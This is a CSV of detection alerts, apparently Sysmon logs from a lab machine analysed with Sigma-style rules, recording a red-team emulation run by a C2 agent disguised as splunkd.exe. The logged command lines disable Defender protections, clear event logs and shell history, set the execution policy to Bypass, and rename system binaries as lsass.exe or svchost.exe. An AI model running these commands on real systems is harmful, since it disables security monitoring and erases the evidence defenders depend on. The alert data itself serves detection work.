"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:13:57.694 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172695,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""copy \""1db90b_T1036.003.exe\"" ($env:TEMP + \""\svchost.exe\""); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\svchost.exe\"")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4408 ¦ PGUID: E9F06A57-9595-694A-D702-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:57.692","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:19:22.043 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172712,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \""\\.\C:\"", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3168 ¦ PGUID: E9F06A57-96DA-694A-E602-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:19:22.037","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:04:39.319 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172629,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6268 ¦ PGUID: E9F06A57-9367-694A-AB02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:04:39.316","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:05:15.346 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172631,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-PSReadlineOption -HistorySaveStyle SaveNothing"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5240 ¦ PGUID: E9F06A57-938B-694A-AC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:05:15.337","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:06:17.380 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172633,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2380 ¦ PGUID: E9F06A57-93C9-694A-AD02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:06:17.370","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.437 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172637,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.428","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:08:56.533 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172649,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Clear-Eventlog Security;Clear-Eventlog System;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8508 ¦ PGUID: E9F06A57-9468-694A-B902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:08:56.521","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:11:33.616 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172660,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4932 ¦ PGUID: E9F06A57-9505-694A-C302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:11:33.610","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.664 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172689,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4192 ¦ PGUID: E9F06A57-9570-694A-D202-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:20.656","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:57.694 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172695,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""copy \""1db90b_T1036.003.exe\"" ($env:TEMP + \""\svchost.exe\""); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\svchost.exe\"")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4408 ¦ PGUID: E9F06A57-9595-694A-D702-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:57.692","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:19:22.043 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172712,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \""\\.\C:\"", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3168 ¦ PGUID: E9F06A57-96DA-694A-E602-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:19:22.037","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:22.002 +01:00","Potential Defense Evasion Via Binary Rename","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",172706,"Cmdline: C:\lsm.exe /c echo T1036.003 ¦ Proc: C:\lsm.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6408 ¦ PGUID: E9F06A57-9625-694A-E002-000000002300 ¦ ParentPID: 1012 ¦ ParentPGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.998","proc_creation_win_renamed_binary.yml","0b333755-398c-777a-1cdf-637d7e1453a1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.060 +01:00","Potential Defense Evasion Via Binary Rename","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",172711,"Cmdline: C:\WINDOWS\Temp\lsass.exe /B ¦ Proc: C:\Windows\Temp\lsass.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe && %SystemRoot%\Temp\lsass.exe /B ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8880 ¦ PGUID: E9F06A57-96A1-694A-E502-000000002300 ¦ ParentPID: 3648 ¦ ParentPGUID: E9F06A57-96A0-694A-E402-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:18:25.056","proc_creation_win_renamed_binary.yml","0b333755-398c-777a-1cdf-637d7e1453a1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.796 +01:00","Potential Defense Evasion Via Rename Of Highly Relevant Binaries","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","car.2013-05-009 ¦ sysmon",172640,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-process ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8840 ¦ PGUID: E9F06A57-9428-694A-B402-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.792","proc_creation_win_renamed_binary_highly_relevant.yml","b3af5e37-931c-e958-27e9-6b3e015c5147","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.276 +01:00","Potential Defense Evasion Via Rename Of Highly Relevant Binaries","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","car.2013-05-009 ¦ sysmon",172642,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localgroup ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8540 ¦ PGUID: E9F06A57-9429-694A-B502-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.275","proc_creation_win_renamed_binary_highly_relevant.yml","b3af5e37-931c-e958-27e9-6b3e015c5147","C:\Tools\Logs\mc_defense.evtx"
